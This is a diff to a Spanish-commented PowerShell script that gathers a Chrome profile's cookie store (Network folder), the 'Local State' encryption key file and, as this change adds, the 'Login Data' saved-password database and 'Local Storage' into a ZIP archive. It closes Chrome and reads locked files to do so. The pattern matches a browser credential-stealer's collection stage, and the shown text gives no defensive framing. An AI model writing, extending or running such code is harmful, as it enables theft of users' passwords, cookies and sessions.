@@ -24,6 +24,7 @@ param(
     [int]$RecurseDepth  = 6,
     [string]$ZipOutputDir = "",
     [string]$ExtraFile  = "Local State",
+    [double]$MaxExtraMB = 25,
     [switch]$KeepZip,
     [switch]$NoCloseChrome
 )
@@ -170,15 +171,46 @@ function Add-FileToArchive {
     }
 }
 
+function Add-FolderToArchive {
+    param(
+        $Archive,
+        [string]$FolderPath,
+        [string]$DestFolder
+    )
+    if (-not (Test-Path -LiteralPath $FolderPath)) {
+        Write-Log "Carpeta extra no encontrada, se omite: $FolderPath" "DarkYellow"
+        return
+    }
+    $files = Get-ChildItem -LiteralPath $FolderPath -File -Recurse -Force `
+        -ErrorAction SilentlyContinue
+    foreach ($f in $files) {
+        $rel = $f.FullName.Substring($FolderPath.Length).TrimStart('\')
+        $entryName = "$DestFolder\$rel"
+        $entry = $Archive.CreateEntry($entryName, [System.IO.Compression.CompressionLevel]::Optimal)
+        try {
+            $fs = New-Object System.IO.FileStream($f.FullName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+            try {
+                $es = $entry.Open()
+                try { $fs.CopyTo($es) } finally { $es.Dispose() }
+            } finally { $fs.Dispose() }
+        } catch {
+            Write-Log "No se pudo incluir '$entryName': $($_.Exception.Message)" "DarkYellow"
+        }
+    }
+}
+
 function Compress-Folder {
     param(
         [string]$SourceFolder,
         [string]$DestinationZip,
-        [string[]]$ExtraFiles
+        [string[]]$ExtraFiles,
+        [hashtable]$ExtraFolders
     )
     # Comprime una carpeta a ZIP usando .NET con FileShare.ReadWrite,
     # asi puede leer archivos bloqueados por otros procesos (ej: Chrome).
-    # Estructura del ZIP: 2 carpetas -> <CarpetaNetwork>\...  y  LocalState\Local State
+    # Estructura del ZIP: carpetas separadas por perfil:
+    #   <CarpetaNetwork>\... , LocalState\Local State ,
+    #   LoginData\Login Data , LocalStorage\...
     $rootName = Split-Path $SourceFolder -Leaf
     $files = Get-ChildItem -LiteralPath $SourceFolder -File -Recurse -Force `
         -ErrorAction SilentlyContinue
@@ -200,10 +232,17 @@ function Compress-Folder {
             }
         }
 
-        # Archivos extra (ej: Local State) -> en su propia carpeta LocalState
+        # Archivos extra (ej: Local State, Login Data) -> en sus propias carpetas
         foreach ($ex in $ExtraFiles) {
             $exName = Split-Path $ex -Leaf
-            Add-FileToArchive -Archive $archive -FilePath $ex -EntryName "LocalState\$exName"
+            Add-FileToArchive -Archive $archive -FilePath $ex -EntryName "$exName\$exName"
+        }
+
+        # Carpetas extra (ej: Local Storage) -> con todo su contenido
+        if ($ExtraFolders) {
+            foreach ($k in $ExtraFolders.Keys) {
+                Add-FolderToArchive -Archive $archive -FolderPath $ExtraFolders[$k] -DestFolder $k
+            }
         }
     } finally {
         $archive.Dispose()
@@ -308,9 +347,29 @@ try {
         $candidate = Join-Path $udr $ExtraFile
         if (Test-Path -LiteralPath $candidate) { $extraFiles += $candidate }
     }
-    $extraFiles = $extraFiles | Select-Object -Unique
+    $extraFiles = @($extraFiles | Select-Object -Unique)
     if ($extraFiles) {
         Write-Log "Archivo(s) extra a incluir: $($extraFiles -join ' | ')" "Cyan"
+    }
+
+    # 3c) Login Data y Local Storage del MISMO perfil que la carpeta Network encontrada
+    $profileDir = Split-Path -Path $sourceFolder -Parent   # ...\User Data\Default
+    $loginData  = Join-Path $profileDir 'Login Data'
+    if (Test-Path -LiteralPath $loginData) {
+        $extraFiles += $loginData
+        Write-Log "Login Data a incluir: $loginData" "Cyan"
+    }
+    $extraFolders = @{}
+    $localStorage = Join-Path $profileDir 'Local Storage'
+    if (Test-Path -LiteralPath $localStorage) {
+        $lsMB = (Get-ChildItem -LiteralPath $localStorage -File -Recurse -Force `
+                    -ErrorAction SilentlyContinue | Measure-Object Length -Sum).Sum / 1MB
+        if ($lsMB -le $MaxExtraMB) {
+            $extraFolders['Local Storage'] = $localStorage
+            Write-Log "Local Storage a incluir ($([math]::Round($lsMB,2)) MB): $localStorage" "Cyan"
+        } else {
+            Write-Log "Local Storage omitido por exceder $MaxExtraMB MB (tiene $([math]::Round($lsMB,2)) MB)." "Yellow"
+        }
     }
 
     if (-not $NoCloseChrome) {
@@ -325,7 +384,7 @@ try {
     $script:ZipPath = Join-Path $ZipOutputDir $zipName
 
     Write-Host "Espere un momento..." -ForegroundColor Yellow
-    Compress-Folder -SourceFolder $sourceFolder -DestinationZip $script:ZipPath -ExtraFiles $extraFiles
+    Compress-Folder -SourceFolder $sourceFolder -DestinationZip $script:ZipPath -ExtraFiles $extraFiles -ExtraFolders $extraFolders
 
     $zipLen = (Get-Item -LiteralPath $script:ZipPath).Length
     if ($zipLen -gt 50MB) {
